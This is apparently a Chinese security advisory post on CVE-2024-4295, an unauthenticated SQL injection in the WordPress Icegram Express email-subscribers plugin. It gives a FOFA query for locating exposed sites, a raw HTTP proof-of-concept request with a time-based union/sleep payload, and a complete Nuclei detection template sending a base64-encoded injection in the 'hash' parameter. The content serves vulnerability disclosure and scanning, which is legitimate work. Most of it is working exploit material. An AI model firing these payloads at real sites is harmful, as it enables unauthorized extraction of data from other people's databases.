# WordPress插件Icegram-Express存在未经身份验证的SQL注入漏洞(CVE-2024-4295)

WordPress 的 Icegram Express 插件的电子邮件订阅者在 5.7.20 及之前的所有版本中都容易通过“hash”参数受到 SQL 注入攻击，原因是对用户提供的参数转义不充分，并且对现有 SQL 缺乏充分的准备询问。 这使得未经身份验证的攻击者可以将额外的 SQL 查询附加到现有的查询中，这些查询可用于从数据库中提取敏感信息。

## fofa

```javascript
body="/wp-content/plugins/email-subscribers/"
```

## poc

```javascript
POST /wp-admin/admin-post.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions][0][0][value]=1111
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502131420209.webp)

```javascript
id: CVE-2024-4295

info:
  name: Email Subscribers by Icegram Express <= 5.7.20 - Unauthenticated SQL Injection via Hash
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  description: |
    Email Subscribers by Icegram Express <= 5.7.20 contains an unauthenticated SQL injection vulnerability via the hash parameter.
  remediation: Fixed in 5.7.21
  impact: This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/641123af-1ec6-4549-a58c-0a08b4678f45?source=cve
    - https://github.com/cve-2024/CVE-2024-4295-Poc
    - https://github.com/truonghuuphuc/CVE-2024-4295-Poc
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4295
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-4295
    cwe-id: CWE-89
    epss-score: 0.00091
    epss-percentile: 0.39447
    cpe: cpe:2.3:a:icegram:email_subscribers_\&_newsletters:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: icegram
    product: email_subscribers_\&_newsletters
    framework: wordpress
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/email-subscribers/"
    fofa-query: body="/wp-content/plugins/email-subscribers/"
  tags: time-based-sqli,cve,cve2024,wordpress,wp-plugin,wp,email-subscribers,sqli

flow: http(1) && http(2)

variables:
  contact_id: "{{contact_id}}"
  email: "{{email}}"
  rawhash: '{"message_id":0,"campaign_id":0,"contact_id":"{{contact_id}}","email":"{{email}}","guid":"dibwol-qaiebd-qvrgkp-lhyopm-rmyfzo","list_ids":["sleep(8)"],"action":"subscribe"}'

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/wp-content/plugins/email-subscribers/readme.txt"

    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "email-subscribers-", "Email Subscribers by Icegram Express")'
        internal: true

  - raw:
      - |
        @timeout: 20s
        GET /?es=optin&hash={{ base64(rawhash) }} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration>=8'
          - 'contains(body, "You have been successfully subscribed")'
        condition: and
```

## 漏洞来源

- https://github.com/projectdiscovery/nuclei-templates/blob/d7a064daf93a42628df88d043b737c7297143645/http/cves/2024/CVE-2024-4295.yaml
- https://mp.weixin.qq.com/s/Shni_iBVEDEP2q-Ng0qcNw